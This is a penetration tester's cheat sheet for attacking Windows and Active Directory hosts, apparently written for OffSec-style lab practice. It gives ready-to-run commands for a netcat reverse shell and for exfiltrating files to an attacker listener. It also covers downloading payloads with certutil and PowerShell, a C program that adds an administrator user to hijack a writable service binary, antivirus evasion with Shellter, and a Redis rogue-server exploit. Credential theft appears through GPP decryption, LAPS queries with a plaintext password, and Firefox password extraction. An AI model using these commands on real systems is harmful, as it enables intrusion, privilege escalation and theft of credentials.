## Misc Commands
**Compile an Executable from a C file**
`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

**Winpeas**
```
[System.Environment]::Is64BitProcess
Make sure process is 64 bit or you might miss stuff
```

**File Retrieval**
```
On Attacker:
nc -lvp <port> > file-name-to-DL

On Victim:
cmd /c '.\nc.exe <attacker-ip> <listening-port> -w 3 < File-to-download'

# Download from attacker  
copy \\<ip>\share\<file>  
# Upload to attacker  
copy <file> \\<ip>\share
```

**Connect back with Netcat**
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```
## Powershell
**Enable powershell file execution**
`Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`

**Look for files with extension**
```
- Get-ChildItem -Path C:\ -Include *.kdbx, *.txt* -File -Recurse -ErrorAction SilentlyContinue
- Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
- Get-ChildItem -Path C:\Users\ -Include *.log, *.kdbx, *.ps1, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.ini, *.xml* -File -Recurse -ErrorAction SilentlyContinue
```

**Downloading Files**
```
- iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
- wget http://192.168.0.1/file -O file.exe
- curl -o <URL>
- certutil.exe -urlcache -f <URL> <file-output-name>
- powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe

Id can't download as SYSTEM, set $ProgressPreference = "SilentlyContinue"
```

**Check Path Env Variable**
`$env:path`

**Check Kerberos Tickets**
`klist`

**Find program**
`where <program name>`
## Evading AV with Shellter
```
- Shellter is a dynamic shellcode injection tool
- Analyzes PE file + execution paths to find where it can inject code
- Just stick with auto, manual is granular/high skill
- Then point at an executable etc
- Choose shell type
- Executable is then transferred to the victim
```

## Situational Awareness
- ALWAYS find this out and write it down
```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

```
- whoami
	- /groups
	- /priv
	- /all
- Get-LocalUser |OR| net user
	- All local users
	- net user <username>
- Get-LocalGroup |OR| net localgroup
	- All groups
	- Get-LocalGroup group_name to view more details on a group
- Get-localgroupmember group_name
	- get-localgroupmember administrators
- systeminfo
- ipconfig /all
	- Networking information
- route print
- **netstat -ano**
	- show all active TCP connections
		- Shows stuff like listening web servers, MSQL servers etc
		- Check for established state for other processes - can exfil creds from other users
	- -a : all active tcp connections
	- -n disable name resolution
	- -o show PID for each connection
- Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
	- Check installed 32bit applications and 64bit
- Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
- Get-Process
- cmdkey /list
	- Passwords
```

**Check out Powershell History**
```
- Get-History
- (Get-PSReadlineOption).HistorySavePath
cat %userprofile%/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt

cat C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Find running services**
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
	- This needs an admin in WinRM/Bind Shell or RDP
	- Can be used for DLL injection
```

**Find Service Permissions**
```
- icacls "C:\xampp\apache\bin\httpd.exe"
- icacls "C:\xampp\mysql\bin\mysqld.exe"

If you find something with DOMAIN\Users:(F), you can replace it with another binary such as

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

Then after compiling:
- PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  
- PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
- PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

Then retart the service with: 
	- net stop <service-name>

If you can't restart the service, see if you can restart the system with SeShutDownPrivilege
	- whoami /priv
	- shutdown /r /y 0
```

**Find Service Paths**
```
	- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
	- Can be used for Unquoted Service paths
```
### PowerUp.ps1
```
Kills at Enum. Still gets things wrong sometimes
	- . .\PowerUp.ps1
	- Get-ModifiableServiceFile
	- Invoke-AllChecks
```

**Poke hole in firwall as admin** 
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<victim IP> localport=2222 action=allow

netsh advfirewall firewall delete rule name="port_forward_ssh_2222
	- how to delete
```

**RDP in**
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```

**Policy Backup Files**
```
Old policy-backup files can have cpassword decrypted with:
- gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

No AD module?
```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```

**View Sessions**
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

**mysql**
```
impacket-mssqlclient
```

**Find Flag**
```
Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem -Path C:\ -Filter proof.txt -Recurse -ErrorAction SilentlyContinue -Force
```

**Redis**
```
- Port 6379
- if < 5.0.5
- https://github.com/n0b0dyCN/redis-rogue-server
- ./redis-rogue-server.py --rhost=192.168.245.176 --rport=6379 --lhost=192.168.45.168 --lport=4443
```

**No Services Open - Spray for Usernames**
```
kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt --dc 172.31.3.4 -d dictionary.csl

Impacket-GetNPUsers -request -format john -dc-ip 172.31.3.4 dictionary/izabel -no-pass
```

**LDAPSEARCH**
```
Find accounts/passwords
- ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)"

Find SAM acount names
- ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass*)" | grep sAMAccountName:
- kerbrute userenum -d hutch.offsec --dc 192.168.188.122 users

Check admin password
- ldapsearch -x -H "ldap://192.168.188.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

**RPCClient**
```
rpcclient -U <username> <ip>
```

**CHECK FOR ISNTALLED PROGRAMS**
```
e.g Firefox is NOT windows default
> cmd.exe /c Firefox -v
> No luck, passwords saved in C:\Users\USername\appdata\roaming\mozilla\firefox\profiles
> https://github.com/unode/firefox_decrypt.git
```

**enum4linux**
```
enum4linux -u '' -p '' -a 192.168.104.90 
```